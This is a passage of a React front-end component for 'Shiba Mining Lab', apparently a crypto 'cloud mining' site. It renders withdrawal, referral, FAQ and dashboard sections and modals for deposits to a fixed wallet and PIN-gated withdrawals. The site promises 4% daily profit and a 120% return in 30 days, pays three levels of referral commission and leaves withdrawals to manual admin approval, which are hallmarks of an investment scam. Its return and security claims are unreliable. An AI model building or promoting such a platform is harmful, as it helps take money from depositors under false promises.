              <span className="inline-block bg-[#f59e0b] text-white text-sm font-medium px-4 py-2 rounded-full mb-4">
                Withdraw
              </span>
              <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                Withdraw Funds
              </h2>
              <p className="text-gray-600">
                Withdraw your mining profits to your wallet
              </p>
            </motion.div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="bg-gray-50 rounded-3xl p-8"
            >
              <div className="grid md:grid-cols-2 gap-6">
                <div className="bg-white rounded-xl p-6 text-center">
                  <div className="text-sm text-gray-500 mb-2">Available Balance</div>
                  <div className="text-3xl font-bold text-[#7c3aed]">${user ? formatNumber(user.balance) : '0.00'}</div>
                  <div className="text-sm text-gray-400">USDT</div>
                </div>
                <div className="bg-white rounded-xl p-6 text-center">
                  <div className="text-sm text-gray-500 mb-2">Minimum Withdrawal</div>
                  <div className="text-3xl font-bold text-[#f59e0b]">$10.00</div>
                  <div className="text-sm text-gray-400">USDT</div>
                </div>
              </div>

              <div className="mt-8 text-center">
                <button
                  onClick={() => {
                    if (!user) {
                      setShowWalletModal(true);
                    } else {
                      setShowWithdrawModal(true);
                    }
                  }}
                  className="px-8 py-4 bg-gradient-to-r from-[#7c3aed] to-[#f59e0b] text-white font-semibold rounded-xl hover:opacity-90 transition-all"
                >
                  <ArrowUpRight className="w-5 h-5 inline mr-2" />
                  Request Withdrawal
                </button>
              </div>
            </motion.div>
          </div>
        </section>

        {/* Referral Section */}
        <section id="referral" className="py-16 px-4 bg-gray-50">
          <div className="max-w-4xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="text-center mb-12"
            >
              <span className="inline-block bg-[#7c3aed] text-white text-sm font-medium px-4 py-2 rounded-full mb-4">
                Referral
              </span>
              <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                Referral Program
              </h2>
              <p className="text-gray-600">
                Earn commissions from your 3-level referral network
              </p>
            </motion.div>

            <div className="grid md:grid-cols-3 gap-6 mb-8">
              {[
                { level: 'Level 1', percent: '5%', color: 'from-[#7c3aed] to-[#a855f7]' },
                { level: 'Level 2', percent: '2%', color: 'from-[#a855f7] to-[#f59e0b]' },
                { level: 'Level 3', percent: '1%', color: 'from-[#f59e0b] to-[#f97316]' }
              ].map((item, index) => (
                <motion.div
                  key={item.level}
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: index * 0.1 }}
                  className={`bg-gradient-to-br ${item.color} rounded-2xl p-6 text-center text-white`}
                >
                  <div className="text-lg font-medium mb-2">{item.level}</div>
                  <div className="text-4xl font-bold">{item.percent}</div>
                  <div className="text-white/80 text-sm mt-2">Commission</div>
                </motion.div>
              ))}
            </div>

            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="bg-white rounded-2xl p-6 shadow-lg"
            >
              {user ? (
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Your Referral Link</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={`${typeof window !== 'undefined' ? window.location.origin : ''}/register?ref=${user.referralCode}`}
                      readOnly
                      className="flex-1 px-4 py-3 rounded-xl bg-gray-50 border border-gray-200 text-sm"
                    />
                    <button
                      onClick={() => copyToClipboard(`${typeof window !== 'undefined' ? window.location.origin : ''}/register?ref=${user.referralCode}`)}
                      className="px-4 py-3 bg-[#7c3aed] text-white rounded-xl hover:bg-[#6d28d9] transition-all"
                    >
                      {copied ? <Check className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                    </button>
                  </div>
                  <div className="mt-4 text-center">
                    <div className="text-sm text-gray-500">Your referral earnings</div>
                    <div className="text-2xl font-bold text-[#7c3aed]">${formatNumber(user.referralEarnings)}</div>
                  </div>
                </div>
              ) : (
                <div className="text-center">
                  <p className="text-gray-600 mb-4">Connect your wallet to get your referral link</p>
                  <button
                    onClick={() => setShowWalletModal(true)}
                    className="px-6 py-3 bg-[#7c3aed] text-white rounded-xl"
                  >
                    Connect Wallet
                  </button>
                </div>
              )}
            </motion.div>
          </div>
        </section>

        {/* Features Section */}
        <section className="relative overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-[#7c3aed] to-[#f59e0b]" />
          
          <div className="relative z-10 max-w-7xl mx-auto px-4 py-16">
            <div className="text-center mb-12">
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                className="inline-block bg-white/20 backdrop-blur-sm rounded-full px-4 py-2 mb-4"
              >
                <span className="text-white text-sm font-medium">Our Special Features</span>
              </motion.div>
              <motion.h2
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                className="text-3xl md:text-4xl font-bold text-white"
              >
                Why Choose Us
              </motion.h2>
            </div>

            <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6">
              {[
                { icon: Shield, title: 'Secure & Reliable', description: 'Advanced security measures protect your investments' },
                { icon: Zap, title: 'Instant Mining', description: 'Start earning immediately after deposit approval' },
                { icon: TrendingUp, title: 'High Returns', description: '4% daily profit with 120% total return' },
                { icon: Headphones, title: '24/7 Support', description: 'Our team is always here to help you' }
              ].map((feature, index) => (
                <motion.div
                  key={feature.title}
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: index * 0.1 }}
                  className="bg-white/10 backdrop-blur-sm rounded-2xl p-6 text-center"
                >
                  <div className="w-12 h-12 mx-auto mb-4 rounded-full bg-white/20 flex items-center justify-center">
                    <feature.icon className="w-6 h-6 text-white" />
                  </div>
                  <h3 className="text-white font-semibold mb-2">{feature.title}</h3>
                  <p className="text-white/70 text-sm">{feature.description}</p>
                </motion.div>
              ))}
            </div>
          </div>
        </section>

        {/* FAQ Section */}
        <section id="faq" className="py-16 px-4 bg-white">
          <div className="max-w-3xl mx-auto">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              className="text-center mb-12"
            >
              <span className="inline-block bg-[#f59e0b] text-white text-sm font-medium px-4 py-2 rounded-full mb-4">
                FAQ
              </span>
              <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                Frequently Asked Questions
              </h2>
              <p className="text-gray-600">
                Your queries answered. Explore our FAQ for clear insights.
              </p>
            </motion.div>

            <div className="space-y-4">
              {[
                { q: 'What is Shiba Mining Lab?', a: 'Shiba Mining Lab is a cloud mining platform that allows you to earn passive income through USDT mining on the BNB Smart Chain.' },
                { q: 'How does mining work?', a: 'After depositing USDT, your mining starts automatically. You earn 4% daily profit for 30 days, totaling 120% return on your investment.' },
                { q: 'What is the minimum deposit?', a: 'The minimum deposit is $10 USDT on the BEP20 network.' },
                { q: 'How do withdrawals work?', a: 'Withdrawals require your security PIN and are processed by our admin team within 24-48 hours.' }
              ].map((item, index) => (
                <motion.div
                  key={index}
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: index * 0.1 }}
                  className="bg-gray-50 rounded-xl p-4"
                >
                  <div className="flex justify-between items-center">
                    <h3 className="font-semibold text-[#7c3aed]">{item.q}</h3>
                    <span className="text-[#7c3aed] text-2xl">+</span>
                  </div>
                </motion.div>
              ))}
            </div>
          </div>
        </section>

        {/* User Dashboard */}
        {user && (
          <section id="dashboard" className="py-16 px-4 bg-gray-50">
            <div className="max-w-6xl mx-auto">
              <motion.div
                initial={{ opacity: 0, y: 20 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                className="text-center mb-12"
              >
                <span className="inline-block bg-[#7c3aed] text-white text-sm font-medium px-4 py-2 rounded-full mb-4">
                  Dashboard
                </span>
                <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
                  Your Dashboard
                </h2>
              </motion.div>

              {/* Stats Cards */}
              <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
                {[
                  { icon: Wallet, label: 'Available Balance', value: `$${formatNumber(user.balance)}`, color: 'text-[#7c3aed]' },
                  { icon: TrendingUp, label: 'Total Profit', value: `$${formatNumber(user.totalProfit)}`, color: 'text-green-600' },
                  { icon: Gift, label: 'Referral Earnings', value: `$${formatNumber(user.referralEarnings)}`, color: 'text-[#f59e0b]' },
                  { icon: Pickaxe, label: 'Mining Status', value: miningData?.status === 'active' ? 'Active' : 'Inactive', color: miningData?.status === 'active' ? 'text-green-600' : 'text-gray-400' }
                ].map((stat, index) => (
                  <motion.div
                    key={stat.label}
                    initial={{ opacity: 0, y: 20 }}
                    whileInView={{ opacity: 1, y: 0 }}
                    viewport={{ once: true }}
                    transition={{ delay: index * 0.1 }}
                    className="bg-white rounded-2xl p-6 shadow-sm"
                  >
                    <div className="flex items-center gap-3 mb-3">
                      <div className="w-10 h-10 rounded-xl bg-gray-100 flex items-center justify-center">
                        <stat.icon className="w-5 h-5 text-gray-600" />
                      </div>
                    </div>
                    <div className="text-sm text-gray-500">{stat.label}</div>
                    <div className={`text-xl font-bold ${stat.color}`}>{stat.value}</div>
                  </motion.div>
                ))}
              </div>

              {/* Mining Progress */}
              {miningData && miningData.status === 'active' && (
                <motion.div
                  initial={{ opacity: 0, y: 20 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }}
                  className="bg-gradient-to-br from-[#7c3aed] to-[#f59e0b] rounded-3xl p-8 text-white"
                >
                  <div className="grid md:grid-cols-2 gap-8">
                    <div>
                      <h3 className="text-2xl font-bold mb-6">Mining Progress</h3>
                      
                      <div className="mb-6">
                        <div className="text-white/70 text-sm mb-2">Real-time Earnings</div>
                        <div className="text-4xl font-bold">${formatNumber(realTimeBalance)}</div>
                      </div>

                      <div className="bg-white/10 rounded-xl p-4 mb-6">
                        <div className="flex justify-between text-sm mb-2">
                          <span className="text-white/70">Progress</span>
                          <span>{formatNumber((realTimeBalance / (miningData.investment * 1.2)) * 100)}%</span>
                        </div>
                        <div className="h-2 bg-white/20 rounded-full overflow-hidden">
                          <div 
                            className="h-full bg-white rounded-full transition-all"
                            style={{ width: `${Math.min((realTimeBalance / (miningData.investment * 1.2)) * 100, 100)}%` }}
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-4 gap-2">
                        {[
                          { value: miningTimer.days, label: 'Days' },
                          { value: miningTimer.hours, label: 'Hours' },
                          { value: miningTimer.minutes, label: 'Min' },
                          { value: miningTimer.seconds, label: 'Sec' }
                        ].map((item) => (
                          <div key={item.label} className="bg-white/10 rounded-xl p-3 text-center">
                            <div className="text-2xl font-bold">{item.value}</div>
                            <div className="text-xs text-white/70">{item.label}</div>
                          </div>
                        ))}
                      </div>
                    </div>

                    <div className="space-y-4">
                      <div className="bg-white/10 rounded-xl p-4 flex justify-between">
                        <span className="text-white/70">Investment</span>
                        <span className="font-semibold">${formatNumber(miningData.investment)}</span>
                      </div>
                      <div className="bg-white/10 rounded-xl p-4 flex justify-between">
                        <span className="text-white/70">Daily Profit</span>
                        <span className="font-semibold text-green-300">${formatNumber(miningData.dailyProfit)}</span>
                      </div>
                      <div className="bg-white/10 rounded-xl p-4 flex justify-between">
                        <span className="text-white/70">Total Expected</span>
                        <span className="font-semibold">${formatNumber(miningData.investment * 1.2)}</span>
                      </div>
                      <div className="bg-white/10 rounded-xl p-4 flex justify-between">
                        <span className="text-white/70">Status</span>
                        <span className="bg-green-500 text-white text-xs px-3 py-1 rounded-full">Active</span>
                      </div>
                    </div>
                  </div>
                </motion.div>
              )}

              {/* Quick Actions */}
              <div className="grid md:grid-cols-2 gap-6 mt-8">
                <button
                  onClick={() => setShowDepositModal(true)}
                  className="bg-[#7c3aed] text-white rounded-2xl p-6 flex items-center justify-center gap-3 hover:bg-[#6d28d9] transition-all"
                >
                  <ArrowDownRight className="w-6 h-6" />
                  <span className="font-semibold text-lg">Make Deposit</span>
                </button>
                <button
                  onClick={() => setShowWithdrawModal(true)}
                  className="bg-[#f59e0b] text-white rounded-2xl p-6 flex items-center justify-center gap-3 hover:bg-[#d97706] transition-all"
                  disabled={user.balance < 10}
                >
                  <ArrowUpRight className="w-6 h-6" />
                  <span className="font-semibold text-lg">Request Withdrawal</span>
                </button>
              </div>
            </div>
          </section>
        )}

        {/* Footer */}
        <footer className="bg-[#7c3aed] py-12 px-4">
          <div className="max-w-7xl mx-auto">
            <div className="grid md:grid-cols-4 gap-8 mb-8">
              <div>
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-10 h-10 rounded-lg bg-[#f59e0b] flex items-center justify-center">
                    <span className="text-white font-bold text-xl">S</span>
                  </div>
                  <div>
                    <span className="text-white font-bold">Shiba Mining Lab</span>
                    <p className="text-white/60 text-xs">Simple USDT Miner</p>
                  </div>
                </div>
                <p className="text-white/70 text-sm">
                  Next generation cloud mining platform for passive income generation.
                </p>
              </div>
              
              <div>
                <h4 className="text-white font-semibold mb-4">Quick Links</h4>
                <ul className="space-y-2 text-white/70 text-sm">
                  <li><a href="#home" className="hover:text-white">Home</a></li>
                  <li><a href="#about" className="hover:text-white">About</a></li>
                  <li><a href="#mining" className="hover:text-white">Mining</a></li>
                  <li><a href="#calculator" className="hover:text-white">Calculator</a></li>
                </ul>
              </div>
              
              <div>
                <h4 className="text-white font-semibold mb-4">Support</h4>
                <ul className="space-y-2 text-white/70 text-sm">
                  <li><a href="#faq" className="hover:text-white">FAQ</a></li>
                  <li><a href="#" className="hover:text-white">Contact Us</a></li>
                  <li><a href="#" className="hover:text-white">Terms of Service</a></li>
                  <li><a href="#" className="hover:text-white">Privacy Policy</a></li>
                </ul>
              </div>
              
              <div>
                <h4 className="text-white font-semibold mb-4">Network</h4>
                <div className="flex items-center gap-2 text-white/70">
                  <div className="w-6 h-6 rounded-full bg-yellow-500 flex items-center justify-center text-xs font-bold text-white">B</div>
                  <span className="text-sm">BNB Smart Chain (BEP20)</span>
                </div>
                <div className="mt-4 flex items-center gap-2 text-white/70">
                  <DollarSign className="w-5 h-5 text-green-400" />
                  <span className="text-sm">USDT</span>
                </div>
              </div>
            </div>
            
            <Separator className="bg-white/20 mb-8" />
            
            <div className="text-center text-white/60 text-sm">
              © 2024 Shiba Mining Lab. All rights reserved.
            </div>
          </div>
        </footer>
      </main>

      {/* Wallet Connect Modal */}
      <Dialog open={showWalletModal} onOpenChange={setShowWalletModal}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-center text-[#7c3aed]">Connect Wallet</DialogTitle>
            <DialogDescription className="text-center text-gray-600">
              Enter your USDT BEP20 wallet address to continue
            </DialogDescription>
          </DialogHeader>
          
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Wallet Address</label>
              <div className="relative">
                <Wallet className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                <Input
                  type="text"
                  value={walletInput}
                  onChange={(e) => setWalletInput(e.target.value)}
                  placeholder="0x..."
                  className="pl-12 font-mono text-sm"
                />
              </div>
              <p className="text-xs text-gray-500 mt-1">Enter your BEP20 wallet address (starts with 0x)</p>
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 text-red-600 rounded-lg p-3 text-sm">
                {error}
              </div>
            )}

            <Button
              onClick={handleWalletConnect}
              className="w-full bg-[#7c3aed] hover:bg-[#6d28d9]"
              disabled={isLoading}
            >
              {isLoading ? <RefreshCw className="w-4 h-4 animate-spin mr-2" /> : <Wallet className="w-4 h-4 mr-2" />}
              {isLoading ? 'Connecting...' : 'Connect Wallet'}
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Setup Account Modal (for new users) */}
      <Dialog open={showSetupModal} onOpenChange={setShowSetupModal}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-center text-[#7c3aed]">Setup Your Account</DialogTitle>
            <DialogDescription className="text-center text-gray-600">
              Create a security PIN for withdrawals
            </DialogDescription>
          </DialogHeader>
          
          <form onSubmit={handleSetupAccount} className="space-y-4">
            <div className="bg-gray-50 rounded-xl p-4 text-center">
              <p className="text-sm text-gray-500 mb-1">Wallet Address</p>
              <p className="font-mono text-sm text-[#7c3aed]">{walletInput}</p>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Security PIN (4 digits) - Required for withdrawals
              </label>
              <div className="relative">
                <Input
                  type={showPin ? 'text' : 'password'}
                  value={setupForm.securityPin}
                  onChange={(e) => setSetupForm({ ...setupForm, securityPin: e.target.value.replace(/\D/g, '').slice(0, 4) })}
                  placeholder="••••"
                  className="text-center text-3xl tracking-widest pr-10"
                  maxLength={4}
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPin(!showPin)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Confirm Security PIN</label>
              <Input
                type="password"
                value={setupForm.confirmPasswordPin}
                onChange={(e) => setSetupForm({ ...setupForm, confirmPasswordPin: e.target.value.replace(/\D/g, '').slice(0, 4) })}
                placeholder="••••"
                className="text-center text-3xl tracking-widest"
                maxLength={4}
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Referral Code (Optional)</label>
              <Input
                type="text"
                value={setupForm.referralCode}
                onChange={(e) => setSetupForm({ ...setupForm, referralCode: e.target.value })}
                placeholder="Enter referral code"
              />
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 text-red-600 rounded-lg p-3 text-sm">
                {error}
              </div>
            )}

            <Button
              type="submit"
              className="w-full bg-[#7c3aed] hover:bg-[#6d28d9]"
              disabled={isLoading}
            >
              {isLoading ? <RefreshCw className="w-4 h-4 animate-spin mr-2" /> : <CheckCircle2 className="w-4 h-4 mr-2" />}
              {isLoading ? 'Creating Account...' : 'Create Account'}
            </Button>
          </form>
        </DialogContent>
      </Dialog>

      {/* Deposit Modal */}
      <Dialog open={showDepositModal} onOpenChange={setShowDepositModal}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-center text-[#7c3aed]">Make Deposit</DialogTitle>
            <DialogDescription className="text-center text-gray-600">
              Send USDT BEP20 to start mining
            </DialogDescription>
          </DialogHeader>
          
          <form onSubmit={handleDeposit} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Amount (USDT)</label>
              <Input
                type="number"
                value={depositForm.amount}
                onChange={(e) => setDepositForm({ ...depositForm, amount: e.target.value })}
                placeholder="Enter amount"
                min="10"
                required
              />
              <p className="text-xs text-gray-500 mt-1">Minimum: $10 USDT</p>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Deposit Wallet</label>
              <div className="flex gap-2">
                <Input
                  type="text"
                  value={DEPOSIT_WALLET}
                  readOnly
                  className="font-mono text-xs"
                />
                <Button
                  type="button"
                  variant="outline"
                  onClick={() => copyToClipboard(DEPOSIT_WALLET)}
                >
                  {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                </Button>
              </div>
            </div>

            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
              <p className="text-xs text-yellow-700">Send only USDT on BEP20 network to this address.</p>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Transaction Hash</label>
              <Input
                type="text"
                value={depositForm.txHash}
                onChange={(e) => setDepositForm({ ...depositForm, txHash: e.target.value })}
                placeholder="0x..."
                className="font-mono text-sm"
                required
              />
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 text-red-600 rounded-lg p-3 text-sm">
                {error}
              </div>
            )}

            <Button
              type="submit"
              className="w-full bg-[#7c3aed] hover:bg-[#6d28d9]"
              disabled={isLoading}
            >
              {isLoading ? <RefreshCw className="w-4 h-4 animate-spin mr-2" /> : <Wallet className="w-4 h-4 mr-2" />}
              {isLoading ? 'Processing...' : 'Submit Deposit'}
            </Button>
          </form>
        </DialogContent>
      </Dialog>

      {/* Withdraw Modal */}
      <Dialog open={showWithdrawModal} onOpenChange={setShowWithdrawModal}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-center text-[#7c3aed]">Request Withdrawal</DialogTitle>
            <DialogDescription className="text-center text-gray-600">
              Withdraw your mining profits
            </DialogDescription>
          </DialogHeader>
          
          <form onSubmit={handleWithdraw} className="space-y-4">
            <div className="bg-gray-50 rounded-xl p-4 text-center">
              <p className="text-sm text-gray-500">Available Balance</p>
              <p className="text-2xl font-bold text-[#7c3aed]">${user ? formatNumber(user.balance) : '0.00'} USDT</p>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Amount (USDT)</label>
              <Input
                type="number"
                value={withdrawForm.amount}
                onChange={(e) => setWithdrawForm({ ...withdrawForm, amount: e.target.value })}
                placeholder="Enter amount"
                min="10"
                max={user?.balance || 0}
                required
              />
              <p className="text-xs text-gray-500 mt-1">Minimum: $10 USDT</p>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Wallet Address</label>
              <Input
                type="text"
                value={withdrawForm.walletAddress}
                onChange={(e) => setWithdrawForm({ ...withdrawForm, walletAddress: e.target.value })}
                placeholder="0x..."
                className="font-mono text-sm"
                required
              />
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 text-red-600 rounded-lg p-3 text-sm">
                {error}
              </div>
            )}

            <Button
              type="submit"
              className="w-full bg-[#7c3aed] hover:bg-[#6d28d9]"
              disabled={isLoading || (user ? user.balance < 10 : true)}
            >
              <ArrowUpRight className="w-4 h-4 mr-2" />
              Continue
            </Button>
          </form>
        </DialogContent>
      </Dialog>

      {/* PIN Verification Modal */}
      <Dialog open={showPinModal} onOpenChange={setShowPinModal}>
        <DialogContent className="max-w-sm">
          <DialogHeader>
            <DialogTitle className="text-2xl font-bold text-center text-[#7c3aed]">Verify PIN</DialogTitle>
            <DialogDescription className="text-center text-gray-600">
              Enter your 4-digit security PIN
            </DialogDescription>
          </DialogHeader>
          
          <form onSubmit={(e) => { e.preventDefault(); confirmWithdraw(); }} className="space-y-4">
            <div>
              <Input
                type="password"
                value={withdrawForm.pin}
                onChange={(e) => setWithdrawForm({ ...withdrawForm, pin: e.target.value.replace(/\D/g, '').slice(0, 4) })}
                placeholder="••••"
                className="text-center text-3xl tracking-widest"
                maxLength={4}
                required
              />
            </div>

            {error && (
              <div className="bg-red-50 border border-red-200 text-red-600 rounded-lg p-3 text-sm">
                {error}
              </div>
            )}

            <div className="flex gap-3">
              <Button
                type="button"
                variant="outline"
                onClick={() => {
                  setShowPinModal(false);
                  setPendingWithdraw(null);
                }}
                className="flex-1"
              >
                Cancel
              </Button>
              <Button
                type="submit"
                className="flex-1 bg-[#7c3aed] hover:bg-[#6d28d9]"
                disabled={isLoading || withdrawForm.pin.length !== 4}
              >
                {isLoading ? <RefreshCw className="w-4 h-4 animate-spin mr-2" /> : <Shield className="w-4 h-4 mr-2" />}
                {isLoading ? 'Processing...' : 'Confirm'}
              </Button>
            </div>
          </form>
        </DialogContent>
      </Dialog>

      {/* Success/Error Toast */}
      <AnimatePresence>
        {success && (
          <motion.div
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 50 }}
            className="fixed bottom-20 left-1/2 -translate-x-1/2 z-50"
          >
            <div className="bg-green-500 text-white rounded-xl px-6 py-3 shadow-lg flex items-center gap-2">
              <CheckCircle2 className="w-5 h-5" />
              {success}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Scroll to top button */}
      <button
        onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
        className="fixed bottom-4 left-4 z-40 w-12 h-12 bg-[#7c3aed] text-white rounded-xl shadow-lg flex items-center justify-center hover:bg-[#6d28d9] transition-all"
      >
        <ArrowUp className="w-5 h-5" />
      </button>
    </div>
  );
}
